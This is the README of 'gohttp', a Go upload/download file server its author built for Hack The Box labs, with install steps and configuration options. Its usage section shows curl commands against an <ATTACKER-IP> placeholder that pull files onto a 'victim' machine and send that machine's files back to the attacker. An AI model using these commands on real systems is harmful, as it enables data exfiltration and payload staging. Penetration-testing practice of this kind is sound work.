# gohttp
![build](https://github.com/hebelsan/gohttp/actions/workflows/build.yml/badge.svg) [![Go Report Card](https://goreportcard.com/badge/github.com/hebelsan/gohttp)](https://goreportcard.com/report/github.com/hebelsan/gohttp) [![Go Reference](https://pkg.go.dev/badge/github.com/hebelsan/gohttp.svg)](https://pkg.go.dev/github.com/hebelsan/gohttp)


While playing on hackthebox.com I was missing the capability to upload files from the victims machines back to my machine with Python SimpleHTTPServer.  
Therefore I wrote **gohttp** which supports both uploading and downloading files just by using the go standard library.

## Installation
### go install
```bash
go install github.com/hebelsan/gohttp@latest
./gohttp
```
### docker
```bash
docker pull ghcr.io/hebelsan/gohttp:latest
docker run --rm -v $(pwd):/mount -p 80:80 ghcr.io/hebelsan/gohttp
```
### manual
```bash
git clone https://github.com/hebelsan/gohttp
go run main.go
```

## Usage
All the files that should be served must be inside the directory where `gohttp` is executed.

###  Download a file from your attack device:
```bash
curl -O http://<ATTACKER-IP>/<FILENAME>
```

###  Upload a file back to your attack device as multipart
```bash
curl -F 'file=@<FILENAME>' http://<ATTACKER-IP>/
```

###  Multiple file upload supported, just add more -F 'file=@<FILENAME>'
```bash
curl -F 'file=@<FILE1>' -F 'file=@<FILE2>' http://<ATTACKER-IP>/
```

###  Upload using raw body and filename header
```bash
curl -H "filename: test.txt" --data "this is raw data" http://<ATTACKER-IP>/
```

## Configuration

### Files root path
Per default every file is transferred from and to the current working directory.  
To change this behaviour:
```bash
export FILES_ROOT=/tmp
```

### Authentication
If you are scared that somebody else in your network 
either get's access to your files or uploads random
files without your permission set:
```bash
export AUTH=API-KEY
```
This will generate a new api key on startup and after each request.  
The key is printed to the console and has to be passed 
as `X-API-KEY` header:
```bash
curl -H "X-API-KEY: F94CE8F8-2E28-7806-94A4-8DF3FB722814" -F 'file=@<FILENAME>' http://<ATTACKER-IP>/
```

### Port
Per default port 80 is used. To change it:
```bash
export PORT=4444
```
